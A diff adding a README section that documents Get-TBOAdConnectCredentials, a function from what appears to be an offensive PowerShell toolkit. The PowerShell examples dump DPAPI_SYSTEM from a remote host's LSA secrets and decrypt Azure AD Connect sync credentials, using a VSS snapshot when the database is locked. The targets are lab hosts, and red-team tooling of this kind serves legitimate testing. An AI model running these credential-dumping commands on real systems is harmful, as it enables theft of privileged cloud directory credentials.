@@ -907,6 +907,24 @@ Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User 
   Get-TBOCredManEntry -MasterKeys $userKeys
 ```
 
+#### Get-TBOAdConnectCredentials
+
+Extracts and decrypts Entra ID (Azure AD) Connect Sync (ADSync) connector credentials from the ADSync database.
+Requires DPAPI_SYSTEM from LSA secrets and a local SQL LocalDB instance to query the downloaded ADSync database files.
+If `ADSync.mdf` is locked on the target, use `-Snapshot` with an `@GMT-...` token from `Get-TBOSmbSnapshots`.
+
+```powershell
+# Extract DPAPI_SYSTEM, then dump AAD Connect credentials.
+Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBOAdConnectCredentials
+
+# Use a VSS snapshot token when the ADSync DB is locked.
+$token = (Get-TBOSmbSnapshots -Path '\\corp1-adconnect01.corp1.lab.home-labs.lol\C$\Program Files\Microsoft Azure AD Sync\Data' |
+  Select-Object -First 1).Token
+Get-TBORegLsaSecrets -ServerName corp1-adconnect01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBOAdConnectCredentials -Snapshot $token
+```
+
 #### Get-TBORegAutoLogon
 
 Reads autologon configuration values from the Winlogon registry key.
